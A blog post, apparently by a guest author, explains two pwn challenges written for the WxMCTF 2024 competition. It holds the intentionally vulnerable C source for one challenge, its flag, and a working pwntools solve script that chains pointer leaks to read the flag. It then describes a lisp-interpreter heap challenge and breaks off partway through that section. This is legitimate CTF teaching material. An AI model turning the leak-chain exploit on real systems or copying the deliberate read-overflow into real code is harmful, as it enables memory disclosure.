@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Challenges I Wrote For WxMCTF 2024 | poni’s blog</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="Challenges I Wrote For WxMCTF 2024" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Intro Even though WxMCTF 2024 was a CTF competition made mostly by high schoolers for high schoolers, I was invited as a guest author by my friend ToadyTop to help them with creating some challenges. What they didn’t yet had done was pwn4 and pwn5 (the second hardest and hardest pwn), so my assigned task was to create them. In this post I will go over my thought process of designing the challenges and the solutions." />
+<meta property="og:description" content="Intro Even though WxMCTF 2024 was a CTF competition made mostly by high schoolers for high schoolers, I was invited as a guest author by my friend ToadyTop to help them with creating some challenges. What they didn’t yet had done was pwn4 and pwn5 (the second hardest and hardest pwn), so my assigned task was to create them. In this post I will go over my thought process of designing the challenges and the solutions." />
+<link rel="canonical" href="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html" />
+<meta property="og:url" content="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html" />
+<meta property="og:site_name" content="poni’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-31T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Challenges I Wrote For WxMCTF 2024" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-31T00:00:00+00:00","datePublished":"2024-03-31T00:00:00+00:00","description":"Intro Even though WxMCTF 2024 was a CTF competition made mostly by high schoolers for high schoolers, I was invited as a guest author by my friend ToadyTop to help them with creating some challenges. What they didn’t yet had done was pwn4 and pwn5 (the second hardest and hardest pwn), so my assigned task was to create them. In this post I will go over my thought process of designing the challenges and the solutions.","headline":"Challenges I Wrote For WxMCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html"},"url":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://poniponiponiponiponiponiponiponiponi.github.io/feed.xml" title="poni&apos;s blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">poni&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/about/software">Software I use and why</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Challenges I Wrote For WxMCTF 2024</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-03-31T00:00:00+00:00" itemprop="datePublished">Mar 31, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="intro">Intro</h1>
+<p>Even though <a href="https://ctftime.org/event/2179/">WxMCTF 2024</a> was a CTF competition made mostly by high schoolers for high schoolers, I was invited as a guest author by my friend ToadyTop to help them with creating some challenges.
+What they didn’t yet had done was pwn4 and pwn5 (the second hardest and hardest pwn), so my assigned task was to create them.
+In this post I will go over my thought process of designing the challenges and the solutions.</p>
+
+<h1 id="pwn4---leakleakleak">pwn4 - leakleakleak</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>leakleakleak
+
+description:
+Leak, leak, leak, leak, I want you in my leak!
+
+flag:
+wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c}
+</code></pre></div></div>
+<p>If you didn’t got it, the challenge’s name is a reference to the song <a href="https://www.youtube.com/watch?v=llyiQ4I-mcQ">Boom, Boom, Boom</a> (maybe next year I should create a nightcore version, heh). At the beginning I thought that challenge might be a little too easy, but at the end it fitted nicely between pwn3 and pwn5, collecting 17 solves. The problem included the source code - binary exploitation problems ain’t reversing problems, IMO most of the time they should include the source code but I’m going off-topic there. If you want to try it out for yourself, there’s the source code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">description</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">User</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">warmup_heap</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">addrs</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">addrs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">9000</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="n">User</span> <span class="o">*</span><span class="nf">create_user</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">User</span> <span class="o">*</span><span class="n">user</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">User</span><span class="p">));</span>
+    <span class="n">user</span><span class="o">-&gt;</span><span class="n">description</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">user</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">destroy_user</span><span class="p">(</span><span class="n">User</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">read_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">flag_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"./flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="kt">off_t</span> <span class="n">flag_size</span> <span class="o">=</span> <span class="n">lseek</span><span class="p">(</span><span class="n">flag_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
+    <span class="n">lseek</span><span class="p">(</span><span class="n">flag_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">flag_fd</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="n">flag_size</span><span class="p">);</span>
+    <span class="n">flag</span><span class="p">[</span><span class="n">flag_size</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\00'</span><span class="p">;</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">flag_fd</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">init</span><span class="p">();</span>
+    <span class="n">read_flag</span><span class="p">();</span>
+    <span class="n">warmup_heap</span><span class="p">();</span>
+
+    <span class="n">User</span> <span class="o">*</span><span class="n">user</span> <span class="o">=</span> <span class="n">create_user</span><span class="p">();</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">_Bool</span> <span class="n">quit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">!</span><span class="n">quit</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"What is your name? "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">));</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Hello %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span>
+            
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Let me tell you something about yourself! :3"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span>
+        
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Continue? (Y/n) "</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'N'</span><span class="p">)</span>
+            <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Boom! Boom, boom, boom! I want YOU in my room!"</span><span class="p">);</span>
+    
+    <span class="n">destroy_user</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>There’s the Dockerfile:</p>
+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> pwn.red/jail</span>
+
+<span class="k">COPY</span><span class="s"> --from=ubuntu:22.04 / /srv</span>
+
+<span class="k">RUN </span><span class="nb">mkdir</span> /srv/app
+<span class="k">COPY</span><span class="s"> flag.txt /srv/app/flag.txt</span>
+<span class="k">COPY</span><span class="s"> leakleakleak /srv/app/run</span>
+</code></pre></div></div>
+
+<p>And there’s the <a href="/files/leakleakleak">included binary</a>.</p>
+
+<h2 id="the-idea">The Idea</h2>
+<p>The idea behind the challenge is to teach people how to find chains of addresses.
+For example we can always assume that on the stack there are other stack addresses, addresses of our binary, and libc addresses.
+We can always expect that there’s a stack address in libc somewhere (for example inside of the <code class="language-plaintext highlighter-rouge">__environ</code> variable).
+However a libc address is on the heap only if some conditions are satisfied.
+In this case <a href="https://sourceware.org/glibc/wiki/MallocInternals">ptmalloc</a>, the glibc’s memory allocator, stores chunks that belong to unsorted, large and small bins as a circular doubly-linked list that starts and ends in libc.
+So to visualize this idea, we can make a directed graph.
+Green arrows mean that it’s very likely there’s a pointer from one to the other, yellow means that maybe there’s a pointer and a red arrow means that a pointer like that is unlikely.
+Of course I’m drawing this from a perspective of a smaller binary, in the case of huge binaries I’m sure there are pointers to everything sprinkled all over the place.
+BEHOLD…
+<img src="/files/leakdiagram.png" alt="Image" /></p>
+
+<p>To elaborate on some choices:</p>
+<ul>
+  <li>The red arrows are there cuz it would be weird if we stored a stack address for example as a global variable inside of our binary - that’s probably a bug.</li>
+  <li>The heap has a lot of yellow arrows as the heap is pretty much almost zeroed. We need to do stuff with it so stuff can show up there.</li>
+</ul>
+
+<h2 id="the-solution">The Solution</h2>
+<p>So the intended solution was to:</p>
+<ul>
+  <li>leak a heap address from the stack,</li>
+  <li>leak a libc address from the heap,</li>
+  <li>leak a stack address from libc,</li>
+  <li>leak the binary address from libc,</li>
+  <li>leak the flag from the binary.</li>
+</ul>
+
+<p>It could be solved in a shorter way by one step, by finding a binary address inside of libc instead of using the stack for it, but honestly I haven’t thought about it while writing the challenge.
+To find the addresses in a GDB session you can dump a bunch of memory and search for the addresses by hand.
+GDB plugins like pwndbg or gef have special commands for finding addresses. I use pwndbg so I’ll show you how to find them there.
+A naive solution would be to try to dump a bunch of pointers with the <code class="language-plaintext highlighter-rouge">telescope</code> command and hope for a lucky find.
+<img src="/files/telescopeleak.png" alt="Image" /></p>
+
+<p>However we can do better than that. In pwndbg we can use the <code class="language-plaintext highlighter-rouge">probeleak</code> command to find what we want for us. In the past I saw someone using GEF and honestly the command equivalent there felt more ergonomic but both can do the same thing.
+<img src="/files/probeleakleak.png" alt="Image" /></p>
+
+<p>In the end, there’s the <code class="language-plaintext highlighter-rouge">solve.py</code> (if you’re confused by the <code class="language-plaintext highlighter-rouge">_patched</code> in the exe name, it’s cuz I use <a href="https://github.com/io12/pwninit">pwninit</a> but removing it also works):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./leakleakleak_patched"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-linux-x86-64.so.2"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Hello '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'!</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'heap leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">libc_addr</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">+</span> <span class="mh">0x110</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Continue?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'name'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">':3</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mi">2208601</span>
+
+    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__environ'</span><span class="p">]</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Continue?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'name'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">':3</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'stack leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">bin_addr</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x150</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Continue?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'name'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">':3</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">bin_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'bin leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_leak</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">flag_addr</span> <span class="o">=</span> <span class="n">bin_leak</span> <span class="o">+</span> <span class="mh">0x2d1e</span> <span class="o">+</span> <span class="mi">36</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'flag addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Continue?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'name'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">':3</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="pwn5---lain-writes-in-lisp">pwn5 - Lain-writes-in-lisp</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lain-writes-in-lisp
+
+description:
+Have you read your SICP today?
+
+flag:
+wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!}
+</code></pre></div></div>
+
+<p>This time the challenge name is a reference to the cult classic anime <a href="https://anilist.co/anime/339/serial-experiments-lain">Serial Experiments Lain</a>.
+And the title is not a drill! We can actually see the main protagonist Lain learning the C programming language at school while <a href="https://www.reddit.com/r/Lain/comments/wb410b/is_this_real_code_and_if_yes_in_which_language/">using Common Lisp at home</a>.
+<img src="https://preview.redd.it/is-this-real-code-and-if-yes-in-which-language-found-it-in-v0-8aved1q18ie91.jpg?width=1080&amp;crop=smart&amp;auto=webp&amp;s=68127b0a2779378c5c33a1ba9184b95107d05d26" alt="Image" /></p>
+
+<p>Overall this challenge got solved 2 times so I’m happy about that. Going by solves it turned out to be the hardest challenge in the competition.</p>
+
+<h2 id="the-idea-1">The Idea</h2>
+<p>So the challenge is a <a href="https://en.wikipedia.org/wiki/Lisp_(programming_language)">lisp-like</a> expression evaluator. This is how we interact with the program:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poni@tsukihime ~/w/w/pwn5 (main)&gt; ./lain
+                  .=.
+                  '='
+                  ___
+       .**.   .*MWWWWWM*.   .**.
+     .MWv"' *MWW'"""""'WWM* '"vWM.
+   .MW"´  .WW.´         `.WW.  `"WM.
+ .MW"     MW/   .*MWM*.   \WM     "MW.
+ MW:     .WW    MWWWWWM    WW.     :WM
+ WW*     'WM    WWWWWWW    MW'     *MW
+  "WM.    WW\   "*WWW*"   /WW    .MW"
+    ':W*. 'WWM.         .MWW' .*W:'
+  .=. `"WW `*WWWv.   .vWWW*´ WW"´ .=.
+  '='        `"*WW   WW*"´        '='
+                WW   WW
+                WW   WW
+        oM.    ,WW   WW.    .Mo
+        `*WM*-*WW'   'WW*-*MW*´
+           `"-"´       `"-"´
+
+CoplandOS &lt;&lt;&lt; (+ 2 (* 3 3))
+11
+CoplandOS &lt;&lt;&lt; (+ "hello" " " "world!")
+hello world!
+CoplandOS &lt;&lt;&lt;
+</code></pre></div></div>
+
+<p>The idea for the solution is that I wanted to create heap challenge that is different that most of your typical note taking programs.
+If you ever tried solving heap exploitation challenges I’m sure you came across those.
+They tend to be popular because they are easy to make, don’t require much creativity and most of the time easy to solve while introducing an idea.
+In essence, the exploit is a basic heap one, however the bug is a little bit more subtle and the <a href="https://en.wikipedia.org/wiki/Heap_feng_shui">heap feng shui</a> is harder to control, as with every expression there are a lot of allocations involved, mixing up <code class="language-plaintext highlighter-rouge">malloc</code>s, <code class="language-plaintext highlighter-rouge">free</code>s and <code class="language-plaintext highlighter-rouge">calloc</code>s. As a footnote: if you didn’t know, calling <code class="language-plaintext highlighter-rouge">calloc</code> isn’t the same as calling <code class="language-plaintext highlighter-rouge">malloc</code> + <code class="language-plaintext highlighter-rouge">memset</code>. By comparing both functions’ source code we can see for example that <code class="language-plaintext highlighter-rouge">calloc</code> avoids anything related to tcache inside of ptmalloc. If I had to make an educated guess it’s because the glibc authors try to avoid zeroing memory as much as possible. In addition to the standard security mitigations like PIE, NX and stack canaries, I also enabled full RELRO. Really for not a particular reason, it doesn’t make the chall harder, it’s just to show that we are getting serious. ;)
+To get to the specifics the code works like a typical process of interpreting a programming language would look like.
+First we <a href="https://en.wikipedia.org/wiki/Lexical_analysis#Tokenization">split our string into tokens</a>.
+Then we transform the tokens into an <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">abstract syntax tree</a> with a <a href="https://en.wikipedia.org/wiki/Recursive_descent_parser">recursive descent parser</a>.
+And at the end we go through all the tree nodes interpreting them in the way.
+In a drawing the process would look like this:
+<img src="/files/evalstages.png" alt="Image" /></p>
+
+<p>Actually I’ve learned all of this by reading <a href="https://craftinginterpreters.com/">Crafting Interpreters</a> in the past, which is a great, great book btw.
+Overall, this is the source code I ended up with: <a href="/files/lisp.c">CLICK</a>. The file is pretty long so I didn’t included it as a code snippet.
+Close to the end you can see a <code class="language-plaintext highlighter-rouge">you_should_be_able_to_solve_this(void)</code> function that calls <code class="language-plaintext highlighter-rouge">/bin/sh</code>. In reality it doesn’t make the chall easier in any way, I included it to be a little cheeky.
+This is the Dockerfile:</p>
